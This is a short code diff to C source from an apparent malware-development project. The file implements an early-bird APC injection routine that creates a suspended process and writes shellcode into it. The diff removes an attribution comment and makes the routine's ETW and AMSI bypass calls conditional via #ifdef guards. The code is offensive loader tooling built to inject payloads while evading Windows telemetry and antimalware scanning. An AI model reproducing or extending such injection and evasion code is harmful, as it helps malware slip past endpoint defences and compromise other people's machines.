@@ -1,5 +1,3 @@
-// @NUL0x4C | @mrd0x : MalDevAcademy
-
 #include "injectors.h"
 
 
@@ -43,18 +41,22 @@ BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName
 	DebugPrint("[i] Suspended Process Created With Pid : %d \n", dwProcessId);
 	DebugPrint("[+] DONE \n\n");
 
+#ifdef ETW_BYPASS
     //	apply ETW bypass
     if (!applyEtwBypass(hProcess)) {
         DebugPrint("[!] Failed To Apply ETW Bypass \n");
         return FALSE;
     }
+#endif
 
+#ifdef AMSI_BYPASS
     //	apply AMSI bypass
 	if (!applyAmsiBypass(hProcess)) {
 		DebugPrint("[!] Failed To Apply AMSI Bypass \n");
 		CloseHandle(hThread);
 		return FALSE;
 	}
+#endif
 
 // injecting the payload and getting the base address of it
 	DebugPrint("[i] Writing Shellcode To The Target Process ...\n");
